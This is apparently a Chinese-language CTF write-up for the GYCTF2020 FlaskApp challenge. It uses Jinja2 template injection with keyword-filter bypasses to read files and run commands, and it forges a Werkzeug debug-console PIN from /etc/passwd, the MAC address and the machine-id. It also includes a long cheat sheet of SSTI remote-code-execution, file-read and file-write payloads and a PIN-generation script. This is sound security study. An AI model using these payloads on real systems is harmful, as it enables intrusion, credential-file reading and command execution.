---
title: GYCTF2020 FlaskApp
date: 2024-05-30 21:04:40
tags: 
      - ssti
      - pin码
categories: 刷题笔记
---

## [GYCTF2020]FlaskApp(ssti jinja2模块/pin码)

### 非预期解

我们往解密页面里随便填写，会进入debug页面

<!-- more -->

![image-20240528212339934](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405282123126.png)

我们在这个页面里找到了一些残余代码

![image-20240528212409589](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405282124711.png)

```
@app.route('/decode',methods=['POST','GET'])
def decode():
    if request.values.get('text') :
        text = request.values.get("text")
        text_decode = base64.b64decode(text.encode())
        tmp = "结果 ： {0}".format(text_decode.decode())
        if waf(tmp) :
            flash("no no no !!")
            return redirect(url_for('decode'))
        res =  render_template_string(tmp)
```

用上了flask模块，并且还存在waf绕过，我们考虑ssti模板注入

加密{{7+7}},得到结果e3s3Kzd9fQ==

![image-20240528212537504](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405282125612.png)

再进行解密，得到结果14，说明存在ssti注入

![image-20240528212620419](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405282126477.png)

我们查看根目录

```
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}
 
 
 这段代码片段是一个使用Jinja2模板的示例，目的是在服务器上执行潜在的有害命令。下面是它的工作原理：
1. `[].__class__.__base__.__subclasses__()`: 这段代码获取了空列表的类的基类的所有子类。实际上，它返回了所有继承自`object`类的类（也就是Python中的所有类）。

2. `{% for c in [].__class__.__base__.__subclasses__() %}`: 这段代码开始遍历所有的子类。

3. `{% if c.__name__=='catch_warnings' %}`: 这段代码检查当前循环中的类是否是`catch_warnings`类，这是Python警告模块中的一个类。

4. `{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}`: 
    - `c.__init__.__globals__['__builtins__']` 访问`catch_warnings`类的`__init__`方法的全局变量中的`__builtins__`字典。
    - `.eval("...")` 评估字符串作为Python表达式。
    - `"__import__('os').popen('ls /').read()"`: 这段代码导入`os`模块并运行命令`ls /`，即列出根目录下的文件和文件夹。

```



加密再解密，返回no,no,no，说明有关键字符被过滤

![image-20240528212916356](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405282129430.png)

我们需要查看源码app.py（用open）

```
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read()}}{% endif %}{% endfor %}
```

![image-20240528213031281](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405282130385.png)

整理一下得

```
 def waf(str):
 black_list = ["flag","os","system","popen","import","eval","chr","request",
 "subprocess","commands","socket","hex","base64","*","?"]
 for x in black_list :
 if x in str.lower() :
 return 1
```

过滤了很多东西

我们使用

1.**字符串拼接进行绕过**

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}
```

加密，解密后得到根目录

![image-20240528213229370](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405282132444.png)

发现flag所在的目录，我们读取

```
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()}}{% endif %}{% endfor %}
```

加密解密，得到flag

**2.倒转输出**

在python中，使用[::-1]可以倒序输出全部，这样就可以绕过过滤

```
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read()}}{% endif %}{% endfor %}
```

得到flag



### 常用payload

无过滤情况

```
#读取文件类，<type ‘file’> file位置一般为40，直接调用
{{[].__class__.__base__.__subclasses__()[40]('flag').read()}} 
{{[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').read()}}
{{[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').readlines()}}
{{[].__class__.__base__.__subclasses__()[257]('flag').read()}} (python3)


#直接使用popen命令，python2是非法的，只限于python3
os._wrap_close 类里有popen
{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}
{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()}}


#调用os的popen执行命令
#python2、python3通用
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls /flag').read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('cat /flag').read()}}
{{''.__class__.__base__.__subclasses__()[185].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /flag').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()}}
#python3专属
{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['os'].popen('ls /').read()}}


#调用eval函数读取
#python2
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}} 
{{"".__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')}}
{{"".__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')}}
{{"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system("ls")')}}
#python3
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('id').read()")}} 
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13]['eval']}}
{{"".__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['__builtins__']['eval']}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}


#调用 importlib类
{{''.__class__.__base__.__subclasses__()[128]["load_module"]("os")["popen"]("ls /").read()}}


#调用linecache函数
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['linecache']['os'].popen('ls /').read()}}
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache']['os'].popen('ls').read()}}
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}}


#调用communicate()函数
{{''.__class__.__base__.__subclasses__()[128]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}


#写文件
写文件的话就直接把上面的构造里的read()换成write()即可，下面举例利用file类将数据写入文件。
{{"".__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/tmp').write('test')}}  ----python2的str类型不直接从属于基类，所以payload中含有两个 .__bases__
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').write('123456')}}


#通用 getshell
原理：找到含有 __builtins__ 的类，利用即可。
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}

```

有过滤情况的

http://t.csdnimg.cn/D3yhd

------

### 预期解（文件包含，pin码生成）

得到PIN码需要六个信息，其中2和3易知

1. flask所登录的用户名

2. modname，一般是flask.app
3. getattr(app, “name”, app.class.name)。一般为Flask
4. flask库下app.py的绝对路径。这个可以由报错信息看出
5. 当前网络的mac地址的十进制数。
6. 机器的id。



1. **flask用户名可以通过读取/etc/passwd来知道**

```
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read() }}{% endif %}{% endfor %}
```

![image-20240528215609282](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405282156392.png)

**2.app.py的绝对路径，可从报错信息中得到**

```
/usr/local/lib/python3.7/site-packages/flask/app.py
```

![image-20240528215740851](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405282157925.png)

**3.当前电脑的MAC地址**

我们可以读取/sys/class/net/eth0/address来获得mac的16进制：

```
{{{}.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/sys/class/net/eth0/address').read()}}

```

![image-20240528215837331](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405282158401.png)

我们去掉：，转化为10进制

得到

```
print(int('0a09795f7b4c',16))  //将一个十六进制字符串转换为十进制整数

11035807284044
```

**4.机器的id**

linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。

对于docker机则读取读取/proc/self/cgroup获取get_machine_id()(docker后面那段字符串)

使用如下:

```python
{% for x in {}.__class__.__base__.__subclasses__() %}
	{% if "warning" in x.__name__ %}
		{{x.__init__.__globals__['__builtins__'].open('/etc/machine-id').read() }}
	{%endif%}
{%endfor%}
```

得到

![image-20240528220204647](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405282202761.png)

使用网上搜的师傅的脚本

```
import hashlib
from itertools import chain

probably_public_bits = [
    'flaskweb'  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '108323369185043',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    '1408f836b0ca514d796cbf8960e45fa1'  # get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)

```

得到PIN码

![image-20240528220342070](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405282203138.png)

点击命令运行框

![image-20240528220825259](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405282208475.png)

输入pin码，打开debug模式

输入代码，得到flag

```
import os
os.popen('cat /this_is_the_flag.txt').read()

```

![image-20240528220508132](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405282205269.png)





###  %的解释

在Jinja2模板中，`%`符号用于包围模板语句，通常用于控制结构（如循环和条件判断）。Jinja2模板是一种强大的模板引擎，允许你在模板中嵌入Python代码和表达式，以动态生成内容。

#### Jinja2模板中的特殊符号

```
{% ... %}: 用于包围控制结构语句，比如条件判断、循环等。

- 例如： `{% for item in list %}...{% endfor %}` 表示一个循环结构。

{{ ... }}: 用于包围表达式。这些表达式会被计算并输出结果。

- 例如： `{{ variable }}` 会输出`variable`变量的值。

{# ... #}: 用于包围注释。注释内容不会出现在渲染后的输出中。

- 例如： `{# This is a comment #}` 是一个注释。
```



1. #### 示例解释

```
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__=='catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}
  {% endif %}
{% endfor %}
```

#### 分析

记得把*删了

1. ```
   1. **{% for c in [].\**class\**.\**base\**.\**subclasses\**() %}**:
      - 这是一个for循环，遍历所有的类。
      - `[].__class__.__base__.__subclasses__()` 生成一个包含所有类的列表。
   2. **{% if c.\**name\**=='catch_warnings' %}**:
      - 这是一个条件判断，检查当前遍历到的类是否名为`catch_warnings`。
   3. **{{ c.\**init\**.\**globals\**['\**builtins\**'].eval("\**import\**('os').popen('ls /').read()")}}**:
      - 这是一个表达式，利用Jinja2的双大括号`{{ ... }}`输出内容。
      - `c.__init__.__globals__['__builtins__']` 访问`catch_warnings`类的`__init__`方法的全局变量中的`__builtins__`字典。
      - `.eval("__import__('os').popen('ls /').read()")` 使用`eval`函数执行恶意代码，这里执行了系统命令`ls /`，列出根目录下的文件和文件夹。
   ```
   
   

#### 总结

`{% ... %}`中的内容不会被直接输出，而是用于控制模板的逻辑。控制结构（如循环和条件判断）通过这些语法实现，从而动态生成内容。而`{{ ... }}`用于在模板中插入变量值或表达式结果。这种灵活性是Jinja2模板强大的原因，但同时也带来了潜在的安全风险，如代码注入攻击，需要谨慎处理和防范。





